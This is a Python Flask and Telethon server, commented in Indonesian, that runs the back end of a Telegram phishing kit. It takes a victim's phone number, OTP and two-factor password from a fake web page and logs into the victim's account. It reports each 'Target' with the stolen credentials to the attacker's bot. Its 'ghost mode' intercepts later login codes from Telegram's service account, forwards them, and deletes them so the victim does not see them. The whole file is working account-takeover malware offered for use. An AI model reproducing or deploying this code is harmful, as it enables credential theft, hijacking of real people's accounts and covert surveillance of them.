import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

app = Flask(__name__)
CORS(app)

# Variabel Lingkungan
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

active_sessions = {}

def send_bot(text, msg_id=None, show_otp=False, nomor=None):
    """Fungsi kirim/edit pesan dengan tombol OTP."""
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    
    if show_otp and nomor:
        payload["reply_markup"] = {
            "inline_keyboard": [[{"text": "otp", "callback_data": f"ghost_{nomor}"}]]
        }

    if msg_id:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload["message_id"] = msg_id
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
    try:
        r = requests.post(url, json=payload).json()
        return r.get("result", {}).get("message_id")
    except:
        return None

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama = data.get('nama', 'User')
    nomor_raw = data.get('nomor')
    
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(nomor)
        # Pesan Awal: Status Pancingan (Satu Pesan Dimulai)
        text = f"⚠️ **Target Masuk!**\nNama Web: {nama}\nNomor: `{nomor}`\n\n_Menunggu OTP dari web..._"
        msg_id = send_bot(text)
        
        active_sessions[nomor] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "nama": nama,
            "msg_id": msg_id
        }
        return jsonify({"status": "sent"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor_raw = data.get('nomor')
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
    otp = data.get('otp')
    sandi = data.get('sandi')

    if nomor not in active_sessions:
        return jsonify({"status": "error", "message": "Sesi hilang"}), 400

    s = active_sessions[nomor]
    client = s["client"]

    try:
        # Cek OTP
        await client.sign_in(nomor, otp, phone_code_hash=s["hash"])
        
        # JIKA SUKSES (Tanpa F2) -> Edit Pesan Awal (Gambar 4)
        text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: None\nOTP: {otp}"
        send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
        return jsonify({"status": "success"}), 200

    except SessionPasswordNeededError:
        # Update pesan ke bot bahwa target butuh 2FA
        text = f"⚠️ **Target Butuh 2FA**\nNama: {s['nama']}\nNomor: `{nomor}`\nStatus: _Input Sandi di Web..._"
        send_bot(text, msg_id=s["msg_id"])
        
        if sandi:
            try:
                await client.sign_in(password=sandi)
                # JIKA SANDI BENAR -> Edit Pesan Awal Jadi Lengkap
                text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP: {otp}"
                send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
                return jsonify({"status": "success"}), 200
            except PasswordHashInvalidError:
                return jsonify({"status": "error", "message": "Kata sandi salah!"}), 400
        return jsonify({"status": "need_2fa"}), 200
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "OTP Salah!"}), 400

@app.route('/webhook', methods=['POST'])
async def webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        if cb["data"].startswith("ghost_"):
            nomor = cb["data"].split("_")[1]
            asyncio.create_task(ghost_mode(nomor))
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif!"})
    return jsonify({"status": "ok"}), 200

async def ghost_mode(nomor):
    s = active_sessions.get(nomor)
    if not s: return
    client = s["client"]
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        match = re.search(r'\b\d{5}\b', event.raw_text)
        if match:
            otp_baru = match.group()
            # Kirim pesan baru khusus OTP yang diintip sesuai video
            text = f"✅ **OTP Ditemukan!**\nNomor: `{nomor}`\nKode: `{otp_baru}`"
            send_bot(text) # Kirim pesan baru agar tidak menumpuk di laporan lama
            await event.delete()

    await client.run_until_disconnected()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
